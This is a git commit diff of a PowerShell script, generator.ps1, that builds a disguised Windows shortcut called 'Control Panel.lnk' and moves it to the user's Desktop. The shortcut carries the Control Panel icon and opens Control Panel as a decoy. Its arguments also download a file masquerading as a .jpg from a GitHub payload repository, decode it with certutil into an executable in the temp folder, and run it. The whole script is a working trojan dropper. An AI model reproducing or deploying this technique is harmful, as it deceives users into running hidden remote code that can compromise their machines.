81ab19b34c704c0e22a743766a79da643fe9bb73
Halit AKAYDIN <63125040+halitAKAYDIN@users.noreply.github.com>
2021-01-20 23:57:00 +0300

    Update generator.ps1

--- generator.ps1
+++ generator.ps1
@@ -1,5 +1,5 @@
 $obj = New-object -comobject wscript.shell
-$link = $obj.createshortcut("c:\Users\Public\Control Panel.lnk")
+$link = $obj.createshortcut("c:\Users\$env:USERNAME\Desktop\Control Panel.lnk")
 $link.targetpath = "C:\Windows\System32\cmd.exe"
 $link.iconlocation = "C:\Windows\System32\control.exe"
 $link.arguments = "/c powershell Start-Process control; Invoke-WebRequest https://raw.githubusercontent.com/halitAKAYDIN/payload/main/file.jpg -O file.jpg & certutil -decode file.jpg %temp%/file.exe & cmd.exe /c %temp%/file.exe"
